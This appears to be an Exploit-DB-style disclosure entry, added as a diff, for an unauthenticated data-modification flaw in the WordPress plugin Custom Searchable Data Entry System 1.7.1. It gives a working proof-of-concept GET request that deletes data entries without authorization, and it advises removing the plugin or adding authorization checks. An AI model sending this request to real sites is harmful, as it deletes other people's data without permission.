@@ -1,0 +1,23 @@
+# Exploit Title: Wordpress Plugin Custom Searchable Data System -
+Unauthenticated Data modification
+# Date: 13 March 2020
+# Exploit Author: Nawaf Alkeraithe
+# Vendor Homepage:
+https://wordpress.org/plugins/custom-searchable-data-entry-system/
+# Software Link:
+https://wordpress.org/plugins/custom-searchable-data-entry-system/
+# Version: 1.7.1
+
+Plugin fails to perform authorization check to delete/add/edit data entries.
+
+PoC (delete entry):
+GET /wordpress/wp-admin/admin.php?page=sds-form-entries&sds-del-entry-first-entry-id=[ENTRY
+ID1]&sds-del-entry-last-entry-id=[ENTRY
+ID2]&sds-del-entry-table-row=wp_ghazale_sds_newtest_inputs
+
+Note: plugin is not maintained now, either remove it, or apply the
+authorization check to all actions.
+
+Special thanks to *Wordfence and Sean Murphy!
+(https://www.wordfence.com/blog/2020/03/active-attack-on-zero-day-in-custom-searchable-data-entry-system-plugin/
+<https://www.wordfence.com/blog/2020/03/active-attack-on-zero-day-in-custom-searchable-data-entry-system-plugin/>)*
